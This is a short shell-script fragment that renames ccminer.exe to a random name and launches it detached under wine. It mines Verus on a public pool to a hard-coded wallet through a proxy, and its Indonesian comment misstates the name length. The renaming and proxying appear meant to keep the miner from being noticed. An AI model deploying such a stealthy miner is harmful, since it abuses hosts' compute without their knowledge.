...
random_name=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 6)  # Menghasilkan nama acak sepanjang 8 karakter
mv ccminer.exe $random_name.exe
screen -d -m bash -c "wine $random_name.exe -a verus -o stratum+tcp://na.luckpool.net:3956 -u RAxQVenbK9dxYRRta1n1CtBtRW1GydoUNk.$random_name -p d=8192S -t 4 --proxy=$proxy_url"
